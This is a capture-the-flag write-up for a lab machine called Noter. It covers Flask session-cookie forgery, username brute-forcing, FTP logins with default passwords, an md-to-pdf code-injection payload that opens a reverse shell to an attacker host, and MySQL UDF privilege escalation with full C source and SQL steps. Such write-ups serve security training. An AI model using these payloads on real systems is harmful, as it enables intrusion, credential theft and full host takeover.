# Noter Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.160 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.160`.

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp  open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
44891/tcp open  unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port `5000` (Werkzeug web server)

We create an account and then sign in. Immediately we notice there is an option to "Upgrade to VIP," but clicking on it shows the message "We are currently not able to provide new premium memberships due to some problems in our end. We will let you know once we are back on. Thank you!"

Let's brute force directories with `ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.11.160:5000/FUZZ`:

```
dashboard               [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 44ms]
login                   [Status: 200, Size: 1963, Words: 427, Lines: 67, Duration: 70ms]
logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 34ms]
notes                   [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 35ms]
register                [Status: 200, Size: 2642, Words: 523, Lines: 95, Duration: 125ms]
```

This finds nothing useful. We can also try scanning for directories with our session cookie to see if anything is only available if the cookie is provided. Run `ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.11.160:5000/FUZZ -H "Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoianVsaWEifQ.Yt3kTQ.UWzojmagq_6leTSG7D43gTP21d4"`. This finds nothing else.

This is a Werkzeug web server so it is probably a [Flask](https://flask.palletsprojects.com/en/2.1.x/) application. Using [this website](https://www.kirsle.net/wizards/flask-session.cgi) we can easily decode the cookie:

```json
{
    "logged_in": true,
    "username": "julia"
}
```

Now, let's try to bruteforce the secret used to sign the session cookie. I wrote a script to do this: [session_cookie_secret_bruteforce.py](session_cookie_secret_bruteforce.py). It is basically the same [script that I wrote to solve a PicoCTF 2021 challenge](https://github.com/HHousen/PicoCTF-2021/blob/6f9f20933e1ed467dbdfcdd7af027a06439e2d84/Web%20Exploitation/Most%20Cookies/script.py). The [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign) tool can also do this bruteforce attack.

The script finds the secret is `secret123`. So, now we can sign cookies. We can try signing the cookie `{"logged_in": true, "username": "admin"}` to see if there is a user with the username `admin`. We use the `flask_cookie` method from the [session_cookie_secret_bruteforce.py](session_cookie_secret_bruteforce.py) script and then run the following:

```
admin_cookie_encoded = flask_cookie(secret_key, {"logged_in": True, "username": "admin"}, "encode")
print("Admin Cookie: %s" % admin_cookie_encoded)
```

The admin cookie is `eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Yt3rCQ.OzacX8Fa8wnFmOzHTUaNy4xaFAc`. Swapping the session cookie for our new `admin` cookie and reloading the page says we are not authorized. We can try logging out but nothing happens. Creating an account with name `admin` works, so the account didn't exist. However, with the two cookies we can switch between the `admin` and `julia` accounts without a password. Thus, we can now try bruteforcing usernames.

I wrote a [username_bruteforce.py] script. It loops through all the usernames in `/usr/share/seclists/Usernames/Names/names.txt`, creates a flask session cookie for each one, and tries to load the Noter dashboard using each cookie. If the dashboard loads with HTTP status code 200 (aka a redirect didn't happen to the login page), then we know we have the correct username. After 1m16s the script tells us that the username is `blue` with cookie `eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yt3vTg.byVuyD6oDmJesXew0i_pbcSir6s`. We can now use that cookie in our browser.

Going to the notes page at `http://10.10.11.160:5000/notes` shows two notes:

1. **Noter Premium Membership**:

```
    Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the
Email)  
  
We all hope you enjoy our service. Thanks!  
  
ftp_admin
```

Also, on the "Export Notes" page there is now a "Export directly from cloud" option where we can enter a URL since the `blue` user is a VIP.

2. **Before the weekend**:

```
    * Delete the password note  
* Ask the admin team to change the password
```

Now, we can sign into the FTP server on port `21`.

### Port `21` (FTP)

Run `ftp 10.10.11.160` to connect via FTP and enter username `blue` and password `blue@Noter!` when prompted:

```
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:kali): blue
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||24477|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
226 Directory send OK.
ftp> ls files/
229 Entering Extended Passive Mode (|||53616|)
150 Here comes the directory listing.
226 Directory send OK.
```

The `files` directory appears empty (maybe we don't have permissions to view files in that folder) and there is a `policy.pdf` file. We can download all the files with `wget -m --user=blue --password=blue@Noter! ftp://10.10.11.160`.

The [policy.pdf](policy.pdf) file discusses Noter's password policy. Interestingly, "Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)"

The first note was signed `ftp_admin` so maybe that account still has its default password of `ftp_admin@Noter!`. Run `ftp 10.10.11.160` to connect via FTP and enter username `ftp_admin` and password `ftp_admin@Noter!` when prompted:

```
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:kali): ftp_admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||37465|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
```

Let's download these files by running `wget -m --user=ftp_admin --password=ftp_admin@Noter! ftp://10.10.11.160`.

## Foothold

There are two app backup ZIP files. Extract the ZIP files and then run `diff app_backup_1635803546/ app_backup_1638395546/` to look at the difference between them (because the numbers at the end are unix times):

```diff
17,18c17,18
< app.config['MYSQL_USER'] = 'root'
< app.config['MYSQL_PASSWORD'] = 'Nildogg36'
---
> app.config['MYSQL_USER'] = 'DB_user'
> app.config['MYSQL_PASSWORD'] = 'DB_password'
21a22,23
> attachment_dir = 'misc/attachments/'
> 
239a242,368
> 
> # Export notes
> @app.route('/export_note', methods=['GET', 'POST'])
> @is_logged_in
> def export_note():
>     if check_VIP(session['username']):
>         try:
>             cur = mysql.connection.cursor()
> 
>             # Get note
>             result = cur.execute("SELECT * FROM notes WHERE author = %s", ([session['username']]))
> 
>             notes = cur.fetchall()
> 
>             if result > 0:
>                 return render_template('export_note.html', notes=notes)
>             else:
>                 msg = 'No notes Found'
>                 return render_template('export_note.html', msg=msg)
>             # Close connection
>             cur.close()
>                 
>         except Exception as e:
>             return render_template('export_note.html', error="An error occured!")
> 
>     else:
>         abort(403)
> 
> # Export local
> @app.route('/export_note_local/<string:id>', methods=['GET'])
> @is_logged_in
> def export_note_local(id):
>     if check_VIP(session['username']):
> 
>         cur = mysql.connection.cursor()
> 
>         result = cur.execute("SELECT * FROM notes WHERE id = %s and author = %s", (id,session['username']))
> 
>         if result > 0:
>             note = cur.fetchone()
> 
>             rand_int = random.randint(1,10000)
>             command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
>             subprocess.run(command, shell=True, executable="/bin/bash")
>         
>             return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)
> 
>         else:
>             return render_template('dashboard.html')
>     else:
>         abort(403)
> 
> # Export remote
> @app.route('/export_note_remote', methods=['POST'])
> @is_logged_in
> def export_note_remote():
>     if check_VIP(session['username']):
>         try:
>             url = request.form['url']
> 
>             status, error = parse_url(url)
> 
>             if (status is True) and (error is None):
>                 try:
>                     r = pyrequest.get(url,allow_redirects=True)
>                     rand_int = random.randint(1,10000)
>                     command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
>                     subprocess.run(command, shell=True, executable="/bin/bash")
> 
>                     if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):
> 
>                         return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)
> 
>                     else:
>                         return render_template('export_note.html', error="Error occured while exporting the !")
> 
>                 except Exception as e:
>                     return render_template('export_note.html', error="Error occured!")
> 
> 
>             else:
>                 return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
>             
>         except Exception as e:
>             return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")
> 
>     else:
>         abort(403)
> 
> # Import notes
> @app.route('/import_note', methods=['GET', 'POST'])
> @is_logged_in
> def import_note():
> 
>     if check_VIP(session['username']):
>         if request.method == 'GET':
>             return render_template('import_note.html')
> 
>         elif request.method == "POST":
>             title = request.form['title']
>             url = request.form['url']
> 
>             status, error = parse_url(url)
> 
>             if (status is True) and (error is None):
>                 try:
>                     r = pyrequest.get(url,allow_redirects=True)
>                     md = "\n\n".join(r.text.split("\n")[:])
> 
>                     body = markdown.markdown(md)
>                     cur = mysql.connection.cursor()
>                     cur.execute("INSERT INTO notes(title, body, author, create_date ) VALUES  (%s, %s, %s ,%s) ", (title, body[:900], session['username'], time.ctime()))                                                                                                                                                             
>                     mysql.connection.commit()
>                     cur.close()
> 
>                     return render_template('import_note.html', msg="Note imported successfully!")
> 
>                 
>                 except Exception as e:
>                     return render_template('import_note.html', error="An error occured when importing!")
> 
>             else:
>                 return render_template('import_note.html', error=f"An error occured when importing! ({error})")
> 
>     else:
>         abort(403)
> 
Common subdirectories: app_backup_1635803546/misc and app_backup_1638395546/misc
Common subdirectories: app_backup_1635803546/templates and app_backup_1638395546/templates

```

We notice that the mysql database credentials used to be hardcoded but where then replaced with placeholder values. The database credential are `root:Nildogg36`.

Looking at `app_backup_1638395546/app.py` we see `export_note_local` and `export_note_remote`:

```python
# Export local
@app.route('/export_note_local/<string:id>', methods=['GET'])
@is_logged_in
def export_note_local(id):
    if check_VIP(session['username']):

        cur = mysql.connection.cursor()

        result = cur.execute("SELECT * FROM notes WHERE id = %s and author = %s", (id,session['username']))

        if result > 0:
            note = cur.fetchone()

            rand_int = random.randint(1,10000)
            command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
            subprocess.run(command, shell=True, executable="/bin/bash")
        
            return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)

        else:
            return render_template('dashboard.html')
    else:
        abort(403)

# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")

                    if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):

                        return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)

                    else:
                        return render_template('export_note.html', error="Error occured while exporting the !")

                except Exception as e:
                    return render_template('export_note.html', error="Error occured!")


            else:
                return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
            
        except Exception as e:
            return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")

    else:
        abort(403)
```

The `md-to-pdf.js` script appears to be used to convert markdown notes to PDFs. Searching online finds the [package's NPM page](https://www.npmjs.com/package/md-to-pdf) and searching for "md-to-pdf vulnerability" finds a ["Code Injection in md-to-pdf" GitHub advisory](https://github.com/advisories/GHSA-x949-7cm6-fm6p): "The package md-to-pdf before 5.0.0 are vulnerable to Remote Code Execution (RCE) due to utilizing the library gray-matter to parse front matter content, without disabling the JS engine." This is CVE-2021-23639.

Looking at the [issue where the vulnerability was reported](https://github.com/simonhaenisch/md-to-pdf/issues/99) gives some proof-of-concept code:

```js
const { mdToPdf } = require('md-to-pdf');

var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';

(async () => {
	await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();
```

It looks like we just need to pass `md-to-pdf` a markdown file with content like `---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE` and it will execute our code. So, our payload is `---js\n((require("child_process")).execSync("bash -i >& /dev/tcp/10.10.14.7/42626 0>&1"))\n---RCE`. I base64 encoded the payload to ensure it runs exactly as intended: `---js\n((require("child_process")).execSync("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQyNjI2IDA+JjE= | base64 -d | bash"))\n---RCE`.

Start a listener with `nc -lvnp 42626` (or use pwncat with `pwncat-cs -lp 42626`). Start a web server with `python -m http.server 8000`. Create a file called `exploit.md` with the above payload contents. Then, in the Noter application, on the "Export Notes" page under the "Export directly from cloud" heading, enter `http://10.10.14.7:8000/exploit.md` into the URL field and click "Export". This should spawn a reverse shell.

Run `cat /home/svc/user.txt` to get the `user.txt` flag. We can copy our SSH key to the `svc` user's `authorized_keys` files and then authenticate over SSH for a full shell. Run `cat ~/.ssh/id_rsa.pub` on the attacker machine and paste the output into `/home/svc/.ssh/authorized_keys` on the target machine.

## Privilege Escalation

Earlier we got the root credentials for MySQL: `root:Nildogg36`. Since we are the root MySQL user, we can use a technique called ["privilege escalation via library"](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library) to get root on the box.

Following the [HackTricks instructions](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library), we need to download this [linux C code](https://www.exploit-db.com/exploits/1518) and compile it inside the linux vulnerable machine.

So, copy paste the following into a file called `raptor_udf2.c` on the target machine:

```c
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
	unsigned int		arg_count;	// number of arguments
	enum Item_result	*arg_type;	// pointer to item_result
	char 			**args;		// pointer to arguments
	unsigned long		*lengths;	// length of string args
	char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
	char			maybe_null;	// 1 if func can return NULL
	unsigned int		decimals;	// for real functions
	unsigned long 		max_length;	// for string functions
	char			*ptr;		// free ptr for func data
	char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	if (args->arg_count != 1)
		return(0);

	system(args->args[0]);

	return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
	return(0);
}
```

Then, run the following commands to compile it:

```
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Next, run the following commands (basically the same as [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library)):

```
(remote) svc@noter:/home/svc$ mysql -u root -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 132
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> create table npn(line blob);
Query OK, 0 rows affected (0.005 sec)

MariaDB [mysql]> insert into npn values(load_file('/home/svc/raptor_udf2.so'));
Query OK, 1 row affected (0.003 sec)

MariaDB [mysql]> select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.001 sec)

MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.001 sec)

MariaDB [mysql]> select do_system("cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt");
+-----------------------------------------------------------------------+
| do_system("cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt") |
+-----------------------------------------------------------------------+
|                                                                     0 |
+-----------------------------------------------------------------------+
1 row in set (0.003 sec)

MariaDB [mysql]> exit
Bye
```

Then, finally run `cat /tmp/root.txt` to get the root flag.
